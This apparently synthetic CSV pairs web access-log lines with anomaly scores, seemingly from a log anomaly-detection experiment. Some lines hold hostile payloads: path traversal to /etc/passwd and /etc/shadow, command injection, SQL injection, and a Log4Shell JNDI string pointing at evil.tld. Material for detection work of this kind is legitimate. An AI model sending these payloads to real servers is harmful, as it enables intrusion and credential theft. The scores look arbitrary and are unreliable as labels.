score_content,score_session,score_fused,score_fused_norm,line
27.055639266967773,,27.055639266967773,27.055639266967773,14.236.44.152 - - [10/Jan/2025:12:44:25 +0000] "POST /search?q=monitor HTTP/1.1" 200 12883 "https://news.ycombinator.com/" "curl/7.85.0"
30163.82421875,,30163.82421875,30163.82421875,17.80.217.35 - - [10/Jan/2025:12:44:28 +0000] "GET /search?q=camera HTTP/1.1" 400 1104 "https://example.com/" "nikto/2.5.0"
30141.662109375,,30141.662109375,30141.662109375,191.108.62.110 - - [10/Jan/2025:12:44:31 +0000] "GET /profile HTTP/1.1" 404 1147 "https://news.ycombinator.com/" "sqlmap/1.7.2#stable"
94.99592590332031,,94.99592590332031,94.99592590332031,105.44.106.243 - - [10/Jan/2025:12:44:31 +0000] "OPTIONS /api/run?cmd=cat+%2Fetc%2Fpasswd HTTP/1.1" 200 7544 "-" "dirb/2.22"
7.535908222198486,,7.535908222198486,7.535908222198486,230.107.73.17 - - [10/Jan/2025:12:44:31 +0000] "POST /dashboard HTTP/1.1" 301 11507 "https://example.com/" "nikto/2.5.0"
103.91549682617188,,103.91549682617188,103.91549682617188,162.6.180.160 - - [10/Jan/2025:12:44:34 +0000] "TRACE /api/products HTTP/1.1" 200 11576 "https://news.ycombinator.com/" "Wget/1.21.2 (linux-gnu)"
2.3209011554718018,,2.3209011554718018,2.3209011554718018,88.161.227.247 - - [10/Jan/2025:12:44:37 +0000] "GET / HTTP/1.1" 204 15089 "https://twitter.com/" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 Version/17.0 Safari/605.1.15"
47.19319152832031,,47.19319152832031,47.19319152832031,54.233.88.122 - - [10/Jan/2025:12:44:39 +0000] "HEAD /logout HTTP/1.1" 200 12759 "-" "Wget/1.21.2 (linux-gnu)"
35.52012252807617,,35.52012252807617,35.52012252807617,54.251.155.39 - - [10/Jan/2025:12:44:40 +0000] "PUT /search?q=camera HTTP/1.1" 200 18761 "https://news.ycombinator.com/" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 Chrome/120.0 Safari/537.36"
126.33476257324219,,126.33476257324219,126.33476257324219,68.52.19.123 - - [10/Jan/2025:12:44:43 +0000] "TRACE /api/product?id=123 HTTP/1.1" 200 7352 "https://www.google.com/" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 Chrome/120.0 Safari/537.36"
69.45574951171875,,69.45574951171875,69.45574951171875,116.163.87.138 - - [10/Jan/2025:12:44:46 +0000] "HEAD /api/run?cmd=cat+%2Fetc%2Fpasswd HTTP/1.1" 200 11750 "https://www.google.com/" "nikto/2.5.0"
24.359621047973633,,24.359621047973633,24.359621047973633,231.49.175.108 - - [10/Jan/2025:12:44:48 +0000] "GET /search?q=camera HTTP/1.1" 200 13527 "https://news.ycombinator.com/" "curl/7.85.0"
47.03142166137695,,47.03142166137695,47.03142166137695,204.26.26.69 - - [10/Jan/2025:12:44:50 +0000] "HEAD /phpmyadmin HTTP/1.1" 200 4245 "https://twitter.com/" "dirb/2.22"
103.97343444824219,,103.97343444824219,103.97343444824219,35.65.8.165 - - [10/Jan/2025:12:44:52 +0000] "TRACE /logout HTTP/1.1" 200 3580 "https://news.ycombinator.com/" "nikto/2.5.0"
30141.908203125,,30141.908203125,30141.908203125,148.193.168.150 - - [10/Jan/2025:12:44:55 +0000] "GET / HTTP/1.1" 403 1073 "https://twitter.com/" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 Chrome/120.0 Safari/537.36"
0.07999287545681,,0.07999287545681,0.07999287545681,194.169.251.70 - - [10/Jan/2025:12:44:56 +0000] "GET /..%2f..%2fetc%2fpasswd HTTP/1.1" 200 9678 "https://news.ycombinator.com/" "dirb/2.22"
6.110949993133545,,6.110949993133545,6.110949993133545,66.166.141.15 - - [10/Jan/2025:12:44:59 +0000] "POST /.env HTTP/1.1" 302 3875 "https://www.google.com/" "curl/7.85.0"
13.149014472961426,,13.149014472961426,13.149014472961426,113.12.122.49 - - [10/Jan/2025:12:45:00 +0000] "PUT /profile HTTP/1.1" 200 2962 "https://news.ycombinator.com/" "sqlmap/1.7.2#stable"
72.57733917236328,,72.57733917236328,72.57733917236328,253.252.192.58 - - [10/Jan/2025:12:45:00 +0000] "OPTIONS /phpmyadmin HTTP/1.1" 201 2223 "https://example.com/" "nikto/2.5.0"
49.66885757446289,,49.66885757446289,49.66885757446289,114.164.36.56 - - [10/Jan/2025:12:45:00 +0000] "DELETE /api/product?id=123 HTTP/1.1" 200 5838 "https://www.google.com/" "nikto/2.5.0"
2.339823007583618,,2.339823007583618,2.339823007583618,106.139.53.4 - - [10/Jan/2025:12:45:01 +0000] "GET / HTTP/1.1" 200 19782 "-" "dirb/2.22"
11124.314453125,,11124.314453125,11124.314453125,2.83.158.23 - - [10/Jan/2025:12:45:02 +0000] "OPTIONS /search?q=laptop HTTP/1.1" 500 712 "https://twitter.com/" "curl/7.85.0"
0.336590975522995,,0.336590975522995,0.336590975522995,24.72.210.232 - - [10/Jan/2025:12:45:03 +0000] "GET /index.html HTTP/1.1" 200 14250 "https://www.google.com/" "nikto/2.5.0"
0.3022647202014923,,0.3022647202014923,0.3022647202014923,205.135.9.66 - - [10/Jan/2025:12:45:06 +0000] "GET /index.html HTTP/1.1" 200 2377 "-" "nikto/2.5.0"
27.401384353637695,,27.401384353637695,27.401384353637695,73.150.50.190 - - [10/Jan/2025:12:45:09 +0000] "DELETE /admin HTTP/1.1" 200 17583 "https://www.google.com/" "dirb/2.22"
2.3342244625091553,,2.3342244625091553,2.3342244625091553,207.149.148.245 - - [10/Jan/2025:12:45:12 +0000] "GET / HTTP/1.1" 201 18332 "-" "sqlmap/1.7.2#stable"
5.0251383781433105,,5.0251383781433105,5.0251383781433105,150.75.188.155 - - [10/Jan/2025:12:45:15 +0000] "GET /admin HTTP/1.1" 304 13915 "https://example.com/" "nikto/2.5.0"
4.686390399932861,,4.686390399932861,4.686390399932861,185.134.169.170 - - [10/Jan/2025:12:45:17 +0000] "POST /api/products HTTP/1.1" 200 7108 "https://twitter.com/" "dirb/2.22"
69.55555725097656,,69.55555725097656,69.55555725097656,190.73.115.197 - - [10/Jan/2025:12:45:19 +0000] "HEAD /search?q=ssd HTTP/1.1" 200 11751 "https://example.com/" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 Version/17.0 Safari/605.1.15"
30208.98828125,,30208.98828125,30208.98828125,148.180.173.84 - - [10/Jan/2025:12:45:19 +0000] "HEAD /search?q=%27+OR+1%3D1+-- HTTP/1.1" 403 308 "https://example.com/" "nikto/2.5.0"
47.20772933959961,,47.20772933959961,47.20772933959961,194.118.178.121 - - [10/Jan/2025:12:45:19 +0000] "HEAD /logout HTTP/1.1" 201 18958 "https://example.com/" "dirb/2.22"
47.2471923828125,,47.2471923828125,47.2471923828125,11.165.57.241 - - [10/Jan/2025:12:45:22 +0000] "HEAD /about HTTP/1.1" 200 18763 "https://example.com/" "curl/7.85.0"
70.82347869873047,,70.82347869873047,70.82347869873047,102.252.1.79 - - [10/Jan/2025:12:45:22 +0000] "OPTIONS /../../etc/passwd HTTP/1.1" 200 2257 "https://twitter.com/" "python-requests/2.31.0"
27.250364303588867,,27.250364303588867,27.250364303588867,127.253.232.16 - - [10/Jan/2025:12:45:24 +0000] "DELETE /api/products HTTP/1.1" 200 886 "https://twitter.com/" "curl/7.85.0"
126.34777069091797,,126.34777069091797,126.34777069091797,216.187.108.57 - - [10/Jan/2025:12:45:25 +0000] "TRACE /search?q=ssd HTTP/1.1" 200 1480 "https://example.com/" "python-requests/2.31.0"
35.42458724975586,,35.42458724975586,35.42458724975586,170.52.170.73 - - [10/Jan/2025:12:45:27 +0000] "PUT /search?q=headphones HTTP/1.1" 200 11041 "https://news.ycombinator.com/" "nikto/2.5.0"
95.11737823486328,,95.11737823486328,95.11737823486328,110.180.9.103 - - [10/Jan/2025:12:45:28 +0000] "OPTIONS /api/user?id=1;DROP TABLE users HTTP/1.1" 200 272 "https://twitter.com/" "python-requests/2.31.0"
3.1078882217407227,,3.1078882217407227,3.1078882217407227,213.221.106.74 - - [10/Jan/2025:12:45:31 +0000] "GET /assets/app.js HTTP/1.1" 301 13874 "https://www.google.com/" "python-requests/2.31.0"
4.813581466674805,,4.813581466674805,4.813581466674805,101.219.131.98 - - [10/Jan/2025:12:45:31 +0000] "GET /dashboard HTTP/1.1" 302 4364 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 Chrome/120.0 Safari/537.36"
3.1526143550872803,,3.1526143550872803,3.1526143550872803,28.159.13.47 - - [10/Jan/2025:12:45:31 +0000] "GET /assets/app.css HTTP/1.1" 304 17430 "https://example.com/" "curl/7.85.0"
29.92620086669922,,29.92620086669922,29.92620086669922,86.141.189.216 - - [10/Jan/2025:12:45:34 +0000] "POST /search?q=laptop HTTP/1.1" 302 4753 "https://twitter.com/" "nikto/2.5.0"
69.57644653320312,,69.57644653320312,69.57644653320312,28.29.206.195 - - [10/Jan/2025:12:45:36 +0000] "HEAD /search?q=ssd HTTP/1.1" 200 19477 "https://twitter.com/" "nikto/2.5.0"
95.0451889038086,,95.0451889038086,95.0451889038086,57.44.116.197 - - [10/Jan/2025:12:45:37 +0000] "OPTIONS /search?q=router HTTP/1.1" 200 15002 "https://www.google.com/" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 Version/17.0 Safari/605.1.15"
72.69208526611328,,72.69208526611328,72.69208526611328,36.254.100.209 - - [10/Jan/2025:12:45:40 +0000] "OPTIONS /contact HTTP/1.1" 201 8439 "https://news.ycombinator.com/" "Wget/1.21.2 (linux-gnu)"
4.81452751159668,,4.81452751159668,4.81452751159668,103.130.218.78 - - [10/Jan/2025:12:45:43 +0000] "GET /dashboard HTTP/1.1" 301 10721 "https://twitter.com/" "curl/7.85.0"
24.200101852416992,,24.200101852416992,24.200101852416992,145.114.129.142 - - [10/Jan/2025:12:45:44 +0000] "GET /search?q=%27+OR+1%3D1+-- HTTP/1.1" 200 3849 "https://example.com/" "curl/7.85.0"
1.963067650794983,,1.963067650794983,1.963067650794983,51.63.234.193 - - [10/Jan/2025:12:45:44 +0000] "GET /api/products HTTP/1.1" 200 1119 "-" "dirb/2.22"
49.64910888671875,,49.64910888671875,49.64910888671875,50.179.93.155 - - [10/Jan/2025:12:45:46 +0000] "DELETE /search?q=laptop HTTP/1.1" 200 15919 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 Chrome/120.0 Safari/537.36"
95.05996704101562,,95.05996704101562,95.05996704101562,110.107.113.166 - - [10/Jan/2025:12:45:47 +0000] "OPTIONS /api/product?id=123 HTTP/1.1" 200 2062 "-" "Wget/1.21.2 (linux-gnu)"
27.084522247314453,,27.084522247314453,27.084522247314453,238.120.64.186 - - [10/Jan/2025:12:45:48 +0000] "POST /search?q=camera HTTP/1.1" 200 15666 "https://twitter.com/" "curl/7.85.0"
27.329526901245117,,27.329526901245117,27.329526901245117,251.196.29.30 - - [10/Jan/2025:12:45:50 +0000] "DELETE /profile HTTP/1.1" 200 18501 "https://twitter.com/" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 Version/17.0 Safari/605.1.15"
49.73749923706055,,49.73749923706055,49.73749923706055,64.108.76.61 - - [10/Jan/2025:12:45:51 +0000] "DELETE /?id=%24%7Bjndi%3Aldap%3A%2F%2Fevil.tld%2Fa%7D HTTP/1.1" 200 11998 "https://twitter.com/" "sqlmap/1.7.2#stable"
0.3060111105442047,,0.3060111105442047,0.3060111105442047,56.95.147.50 - - [10/Jan/2025:12:45:54 +0000] "GET /index.html HTTP/1.1" 200 4517 "https://news.ycombinator.com/" "sqlmap/1.7.2#stable"
27.068571090698242,,27.068571090698242,27.068571090698242,44.69.155.94 - - [10/Jan/2025:12:45:55 +0000] "POST /search?q=router HTTP/1.1" 200 10199 "https://www.google.com/" "curl/7.85.0"
70.96054077148438,,70.96054077148438,70.96054077148438,108.35.107.32 - - [10/Jan/2025:12:45:57 +0000] "OPTIONS /wp-login.php HTTP/1.1" 200 17335 "https://example.com/" "curl/7.85.0"
69.49633026123047,,69.49633026123047,69.49633026123047,176.36.103.253 - - [10/Jan/2025:12:45:58 +0000] "HEAD /search?q=laptop HTTP/1.1" 200 16779 "https://example.com/" "Wget/1.21.2 (linux-gnu)"
35.532012939453125,,35.532012939453125,35.532012939453125,75.151.54.56 - - [10/Jan/2025:12:46:01 +0000] "PUT /api/backup?file=../../../../etc/shadow HTTP/1.1" 200 1088 "https://www.google.com/" "curl/7.85.0"
49.692691802978516,,49.692691802978516,49.692691802978516,37.18.177.254 - - [10/Jan/2025:12:46:02 +0000] "DELETE /api/product?id=123 HTTP/1.1" 200 13345 "https://www.google.com/" "sqlmap/1.7.2#stable"
3.054896593093872,,3.054896593093872,3.054896593093872,228.124.200.3 - - [10/Jan/2025:12:46:02 +0000] "GET /assets/app.css HTTP/1.1" 301 1341 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 Chrome/120.0 Safari/537.36"
69.53971862792969,,69.53971862792969,69.53971862792969,95.90.247.218 - - [10/Jan/2025:12:46:02 +0000] "HEAD /api/product?id=123 HTTP/1.1" 200 14071 "https://twitter.com/" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 Version/17.0 Safari/605.1.15"
24.354223251342773,,24.354223251342773,24.354223251342773,132.110.170.36 - - [10/Jan/2025:12:46:05 +0000] "GET /search?q=monitor HTTP/1.1" 200 19485 "https://www.google.com/" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 Version/17.0 Safari/605.1.15"
72.33499145507812,,72.33499145507812,72.33499145507812,136.59.187.80 - - [10/Jan/2025:12:46:07 +0000] "HEAD /search?q=router HTTP/1.1" 302 4729 "https://twitter.com/" "curl/7.85.0"
129.27488708496094,,129.27488708496094,129.27488708496094,36.64.87.107 - - [10/Jan/2025:12:46:10 +0000] "TRACE /search?q=ssd HTTP/1.1" 304 7988 "https://www.google.com/" "curl/7.85.0"
102.12012481689453,,102.12012481689453,102.12012481689453,220.61.207.105 - - [10/Jan/2025:12:46:11 +0000] "TRACE /cgi-bin/test.cgi HTTP/1.1" 200 16219 "-" "nikto/2.5.0"
95.08576965332031,,95.08576965332031,95.08576965332031,152.196.58.5 - - [10/Jan/2025:12:46:12 +0000] "OPTIONS /api/product?id=123 HTTP/1.1" 200 11490 "https://twitter.com/" "python-requests/2.31.0"
27.08960723876953,,27.08960723876953,27.08960723876953,253.217.17.118 - - [10/Jan/2025:12:46:13 +0000] "POST /search?q=laptop HTTP/1.1" 200 17609 "https://www.google.com/" "dirb/2.22"
103.89220428466797,,103.89220428466797,103.89220428466797,242.91.139.111 - - [10/Jan/2025:12:46:16 +0000] "TRACE /dashboard HTTP/1.1" 200 10811 "https://example.com/" "python-requests/2.31.0"
49.63508605957031,,49.63508605957031,49.63508605957031,114.203.229.45 - - [10/Jan/2025:12:46:19 +0000] "DELETE /search?q=router HTTP/1.1" 200 11037 "https://example.com/" "nikto/2.5.0"
0.24114413559436798,,0.24114413559436798,0.24114413559436798,254.149.197.235 - - [10/Jan/2025:12:46:19 +0000] "GET /assets/app.css HTTP/1.1" 200 18992 "-" "dirb/2.22"
24.356708526611328,,24.356708526611328,24.356708526611328,146.47.142.45 - - [10/Jan/2025:12:46:22 +0000] "GET /search?q=phone HTTP/1.1" 200 5435 "https://www.google.com/" "dirb/2.22"
2.3332765102386475,,2.3332765102386475,2.3332765102386475,109.76.54.131 - - [10/Jan/2025:12:46:22 +0000] "GET / HTTP/1.1" 200 17153 "https://news.ycombinator.com/" "python-requests/2.31.0"
49.63081359863281,,49.63081359863281,49.63081359863281,137.189.190.25 - - [10/Jan/2025:12:46:24 +0000] "DELETE /search?q=monitor HTTP/1.1" 200 16978 "-" "Wget/1.21.2 (linux-gnu)"
3.2114369869232178,,3.2114369869232178,3.2114369869232178,227.114.50.93 - - [10/Jan/2025:12:46:27 +0000] "GET /.git/config HTTP/1.1" 304 10523 "-" "python-requests/2.31.0"
30234.537109375,,30234.537109375,30234.537109375,93.7.139.55 - - [10/Jan/2025:12:46:29 +0000] "OPTIONS /search?q=phone HTTP/1.1" 400 724 "https://example.com/" "python-requests/2.31.0"
4.72514009475708,,4.72514009475708,4.72514009475708,236.222.180.209 - - [10/Jan/2025:12:46:30 +0000] "POST /contact HTTP/1.1" 200 4582 "https://www.google.com/" "python-requests/2.31.0"
103.96321105957031,,103.96321105957031,103.96321105957031,161.162.30.171 - - [10/Jan/2025:12:46:32 +0000] "TRACE /contact HTTP/1.1" 200 11984 "https://twitter.com/" "dirb/2.22"
75.58340454101562,,75.58340454101562,75.58340454101562,192.4.210.195 - - [10/Jan/2025:12:46:35 +0000] "OPTIONS /contact HTTP/1.1" 302 10589 "https://www.google.com/" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 Chrome/120.0 Safari/537.36"
104.0511245727539,,104.0511245727539,104.0511245727539,92.213.10.5 - - [10/Jan/2025:12:46:36 +0000] "TRACE /admin HTTP/1.1" 200 16929 "https://twitter.com/" "nikto/2.5.0"
30163.912109375,,30163.912109375,30163.912109375,98.79.44.173 - - [10/Jan/2025:12:46:39 +0000] "GET /search?q=phone HTTP/1.1" 401 457 "https://www.google.com/" "curl/7.85.0"
95.1002197265625,,95.1002197265625,95.1002197265625,24.7.136.122 - - [10/Jan/2025:12:46:42 +0000] "OPTIONS /api/product?id=123 HTTP/1.1" 201 17399 "https://twitter.com/" "nikto/2.5.0"
69.60267639160156,,69.60267639160156,69.60267639160156,212.166.125.98 - - [10/Jan/2025:12:46:43 +0000] "HEAD /?id=%24%7Bjndi%3Aldap%3A%2F%2Fevil.tld%2Fa%7D HTTP/1.1" 200 19509 "https://twitter.com/" "curl/7.85.0"
25.800006866455078,,25.800006866455078,25.800006866455078,199.8.6.111 - - [10/Jan/2025:12:46:46 +0000] "DELETE /.env HTTP/1.1" 200 4647 "-" "dirb/2.22"
2.0291876792907715,,2.0291876792907715,2.0291876792907715,186.92.160.215 - - [10/Jan/2025:12:46:46 +0000] "GET /profile HTTP/1.1" 200 11716 "https://twitter.com/" "curl/7.85.0"
27.102092742919922,,27.102092742919922,27.102092742919922,82.239.114.51 - - [10/Jan/2025:12:46:48 +0000] "DELETE /server-status HTTP/1.1" 200 2689 "https://example.com/" "nikto/2.5.0"
27.07758331298828,,27.07758331298828,27.07758331298828,184.179.34.250 - - [10/Jan/2025:12:46:49 +0000] "POST /search?q=laptop HTTP/1.1" 200 13180 "https://example.com/" "dirb/2.22"
106.90107727050781,,106.90107727050781,106.90107727050781,9.177.199.234 - - [10/Jan/2025:12:46:51 +0000] "TRACE /profile HTTP/1.1" 304 16204 "-" "nikto/2.5.0"
47.24409103393555,,47.24409103393555,47.24409103393555,243.134.48.149 - - [10/Jan/2025:12:46:51 +0000] "HEAD /logout HTTP/1.1" 200 183 "-" "sqlmap/1.7.2#stable"
30166.982421875,,30166.982421875,30166.982421875,230.185.121.108 - - [10/Jan/2025:12:46:53 +0000] "DELETE /login HTTP/1.1" 403 789 "https://www.google.com/" "python-requests/2.31.0"
7.716239929199219,,7.716239929199219,7.716239929199219,64.33.114.100 - - [10/Jan/2025:12:46:54 +0000] "POST /logout HTTP/1.1" 304 17659 "https://news.ycombinator.com/" "nikto/2.5.0"
13.223560333251953,,13.223560333251953,13.223560333251953,1.141.145.202 - - [10/Jan/2025:12:46:54 +0000] "PUT /about HTTP/1.1" 200 3243 "https://twitter.com/" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 Version/17.0 Safari/605.1.15"
1.9805587530136108,,1.9805587530136108,1.9805587530136108,180.220.53.223 - - [10/Jan/2025:12:46:54 +0000] "GET /dashboard HTTP/1.1" 201 19404 "https://news.ycombinator.com/" "sqlmap/1.7.2#stable"
49.845821380615234,,49.845821380615234,49.845821380615234,67.87.31.241 - - [10/Jan/2025:12:46:55 +0000] "HEAD /server-status HTTP/1.1" 302 10053 "https://twitter.com/" "curl/7.85.0"
13.231246948242188,,13.231246948242188,13.231246948242188,28.156.163.222 - - [10/Jan/2025:12:46:55 +0000] "PUT /about HTTP/1.1" 200 5959 "https://twitter.com/" "python-requests/2.31.0"
2.3265247344970703,,2.3265247344970703,2.3265247344970703,110.142.66.242 - - [10/Jan/2025:12:46:58 +0000] "GET / HTTP/1.1" 201 15374 "https://news.ycombinator.com/" "Wget/1.21.2 (linux-gnu)"
126.2173080444336,,126.2173080444336,126.2173080444336,103.224.93.213 - - [10/Jan/2025:12:47:01 +0000] "TRACE /search?q=headphones HTTP/1.1" 200 9635 "https://news.ycombinator.com/" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 Chrome/120.0 Safari/537.36"
13.143672943115234,,13.143672943115234,13.143672943115234,157.63.164.168 - - [10/Jan/2025:12:47:04 +0000] "PUT /api/products HTTP/1.1" 200 17036 "-" "nikto/2.5.0"
47.145751953125,,47.145751953125,47.145751953125,18.247.206.126 - - [10/Jan/2025:12:47:06 +0000] "HEAD /contact HTTP/1.1" 200 9116 "https://www.google.com/" "dirb/2.22"
69.45928192138672,,69.45928192138672,69.45928192138672,81.83.147.3 - - [10/Jan/2025:12:47:09 +0000] "HEAD /search?q=laptop HTTP/1.1" 200 4642 "https://example.com/" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 Chrome/120.0 Safari/537.36"
0.2364133894443512,,0.2364133894443512,0.2364133894443512,240.80.36.70 - - [10/Jan/2025:12:47:11 +0000] "GET /assets/app.css HTTP/1.1" 200 17113 "https://example.com/" "python-requests/2.31.0"
24.35126304626465,,24.35126304626465,24.35126304626465,104.99.130.43 - - [10/Jan/2025:12:47:11 +0000] "GET /search?q=phone HTTP/1.1" 200 3521 "https://news.ycombinator.com/" "curl/7.85.0"
24.37169647216797,,24.37169647216797,24.37169647216797,31.172.133.182 - - [10/Jan/2025:12:47:12 +0000] "GET /search?q=phone HTTP/1.1" 200 9986 "https://twitter.com/" "dirb/2.22"
52.5462760925293,,52.5462760925293,52.5462760925293,9.58.125.119 - - [10/Jan/2025:12:47:12 +0000] "DELETE /api/product?id=123 HTTP/1.1" 301 12587 "https://example.com/" "nikto/2.5.0"
47.164794921875,,47.164794921875,47.164794921875,193.177.83.231 - - [10/Jan/2025:12:47:14 +0000] "HEAD /logout HTTP/1.1" 200 3641 "https://www.google.com/" "dirb/2.22"
5.210943222045898,,5.210943222045898,5.210943222045898,148.229.21.217 - - [10/Jan/2025:12:47:17 +0000] "GET / HTTP/1.1" 302 18026 "https://example.com/" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 Chrome/120.0 Safari/537.36"
49.72645568847656,,49.72645568847656,49.72645568847656,243.8.124.25 - - [10/Jan/2025:12:47:18 +0000] "DELETE /search?q=ssd HTTP/1.1" 200 17453 "https://www.google.com/" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 Chrome/120.0 Safari/537.36"
126.2334213256836,,126.2334213256836,126.2334213256836,230.31.216.55 - - [10/Jan/2025:12:47:18 +0000] "TRACE /search?q=headphones HTTP/1.1" 200 15068 "https://news.ycombinator.com/" "python-requests/2.31.0"
72.40036010742188,,72.40036010742188,72.40036010742188,200.184.244.189 - - [10/Jan/2025:12:47:19 +0000] "HEAD /api/backup?file=../../../../etc/shadow HTTP/1.1" 301 16207 "https://news.ycombinator.com/" "python-requests/2.31.0"
